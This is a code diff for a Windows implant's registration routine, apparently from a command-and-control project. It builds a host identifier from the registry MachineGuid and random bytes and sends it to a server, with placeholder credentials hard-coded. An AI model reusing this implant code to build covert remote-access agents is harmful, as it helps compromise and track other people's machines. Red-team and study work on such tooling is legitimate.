@@ -17,8 +17,9 @@
 #include <pb_decode.h>
 #include "implant.pb.h"
 
-
-LPBYTE *ImplantID;
+LPBYTE ImplantID_PT1 = NULL; // MachineGUID
+LPBYTE ImplantID_PT2 = NULL; // RandomBytes
+LPBYTE ImplantID = NULL; // MachineGUID + RandomBytes
 
 // Function to RegisterImplant message
 BYTE *EncodeRegisterImplant(RegisterImplant *ri, size_t *bufferSize) {
@@ -39,34 +40,116 @@ BYTE *EncodeRegisterImplant(RegisterImplant *ri, size_t *bufferSize) {
 		return NULL;
 	}
 
-        printf("[+] Successfully encoded: %llu\n", stream.bytes_written);
+        DEBUG_PRINTF("[+] Successfully encoded: %llu\n", stream.bytes_written);
 	return registerBuffer;
 }
 
-// Function to set the ImplantID using the machine's GUID
-void ReadMachineGUID() {
-	DWORD dwSize = 255;
-	ImplantID = malloc(dwSize);
-	LONG res =
-		RegGetValueA(HKEY_LOCAL_MACHINE,
-				"SOFTWARE\\Microsoft\\Cryptography",
-				"MachineGuid",
-				RRF_RT_REG_SZ,
-				NULL,
-				ImplantID,
-				&dwSize);
+int GetMachineGUID() {
+	DWORD dwSize = 0;
+
+	RegGetValueA(HKEY_LOCAL_MACHINE,
+                        "SOFTWARE\\Microsoft\\Cryptography",
+                        "MachineGuid",
+                        RRF_RT_REG_SZ,
+                        NULL,
+                        NULL,
+                        &dwSize);
+	
+	ImplantID_PT1 = malloc(dwSize);
+
+	LONG res = RegGetValueA(HKEY_LOCAL_MACHINE,
+			"SOFTWARE\\Microsoft\\Cryptography",
+			"MachineGuid",
+			RRF_RT_REG_SZ,
+			NULL,
+			ImplantID_PT1,
+			&dwSize);
+
 	if (res) {
-		DEBUG_PRINTF("Failed to get machine guid\n");
-		exit(1);
+		DEBUG_PRINTF("Failed to get MachineGUID\n");
+		return 1;
 	}
+	return 0;
+}
+
+BYTE *GenerateRandomBytes() {
+	HCRYPTPROV hCryptProv;
+	
+	if (!CryptAcquireContext(&hCryptProv,
+				NULL,
+				NULL,
+				PROV_RSA_FULL,
+				CRYPT_VERIFYCONTEXT)) {
+		DEBUG_PRINTF("Error acquiring cryptographic context.\n");
+		return NULL;
+	}
+
+	BYTE *randomBytes = (BYTE *)malloc(RANDOM_BYTES_SIZE);
+	if (!CryptGenRandom(hCryptProv,
+				RANDOM_BYTES_SIZE,
+				randomBytes)) {
+		DEBUG_PRINTF("Error generating random bytes.\n");
+		CryptReleaseContext(hCryptProv, 0);
+		return NULL;
+	}
+	CryptReleaseContext(hCryptProv, 0);
+
+	return randomBytes;
+}
+
+int BytesToHexString(const BYTE *bytes) {
+	if (bytes == NULL) {
+		return 1;
+	}
+	
+	ImplantID_PT2 = malloc(HEX_STRING_SIZE);
+	const char *hexChars = "0123456789abcdef";
+	for (int i = 0; i < RANDOM_BYTES_SIZE; i++) {
+		ImplantID_PT2[i * 2] = hexChars[bytes[i] >> 4];
+		ImplantID_PT2[i * 2 + 1] = hexChars[bytes[i] & 0x0F];
+	}
+	ImplantID_PT2[HEX_STRING_SIZE - 1] = '\0';
+
+	return 0;
+}
+
+char* concat(const char *s1, const char *s2) {
+    const size_t len1 = strlen(s1);
+    const size_t len2 = strlen(s2);
+    char *result = malloc(len1 + len2 + 1); // +1 for the null-terminator
+    // in real code you would check for errors in malloc here
+    memcpy(result, s1, len1);
+    memcpy(result + len1, s2, len2 + 1); // +1 to copy the null-terminator
+    return result;
+}
+
+// Function to set the ImplantID using the machine's GUID
+char *SetID() {
+
+	if (GetMachineGUID() == 1) {
+		DEBUG_PRINTF("MachineID is not set...\n");
+	}
+
+	if (BytesToHexString(GenerateRandomBytes()) == 1) {
+		DEBUG_PRINTF("RandomBytes is NULL...\n");
+        }
+
+	// DEBUG_PRINTF("ImplantID_PT1 = %s\n", ImplantID_PT1);
+	// DEBUG_PRINTF("ImplantID_PT2 = %s\n", ImplantID_PT2);
+
+	ImplantID = (LPBYTE )concat((const char *)ImplantID_PT1, (const char *)ImplantID_PT2);
+
+	return (char *)ImplantID;
 }
 
 // Function to register Implant with the Server
 int RegisterSelf() {
 	RegisterImplant ri = RegisterImplant_init_zero;
-	
-	ri.GUID = "1234567890";
-	ri.Hostname = "test";
+
+	ri.GUID = SetID();
+	DEBUG_PRINTF("IMPLANT GUID = %s\n", ri.GUID);
+
+	ri.Hostname = "test" ;
 	ri.Username = "userwoozer";
 	ri.Password = "pass";
 
